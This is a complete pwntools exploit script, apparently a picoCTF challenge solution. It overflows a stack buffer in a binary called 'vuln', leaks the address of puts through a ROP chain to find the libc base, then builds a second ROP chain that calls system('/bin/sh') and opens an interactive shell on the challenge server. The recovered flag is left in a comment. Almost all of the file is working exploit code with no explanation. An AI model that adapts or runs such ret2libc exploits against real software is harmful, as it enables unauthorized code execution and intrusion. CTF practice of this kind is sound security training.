#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
	if not args.REMOTE:
		return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path}, aslr=False)
	else:
		return remote("mercury.picoctf.net", 37289)


def main():
	r = conn()
	r.recvline()
	padding = b'A'*128 + b'B'*8

	# Stage 1: Leak puts address, and use that to find libc base address
	rop = ROP(exe)
	rop.puts(exe.got['puts'])
	rop.call(exe.symbols['main'])
	log.info('Stage 1 ROP Chain:\n' + rop.dump())

	# Send the payload and get leaked address
	exp = padding + bytes(rop)
	r.sendline(exp)
	leaked_puts = r.recvuntil('WeLcOmE')[-14:-7].strip().ljust(8, b'\0')
	print(leaked_puts)
	leaked_puts = u64(leaked_puts)
	log.success('Leaked puts: ' + hex(leaked_puts))
	libc.address = leaked_puts - libc.symbols['puts']
	log.success('Libc base address: ' + hex(libc.address))

	# Stage 2: Run system
	rop = ROP(libc)
	rop.raw(rop.ret)
	# rop.raw(rop.ret)
	rop.system(next(libc.search(b'/bin/sh')))
	log.info('Stage 2 ROP Chain:\n' + rop.dump())

	# Send the payload and get a shell
	exp = padding + bytes(rop)
	# gdb.attach(r)
	r.recvline()
	r.sendline(exp)
	r.interactive()

	# picoCTF{1_<3_sm4sh_st4cking_e900800fb4613d1e}


if __name__ == "__main__":
	main()
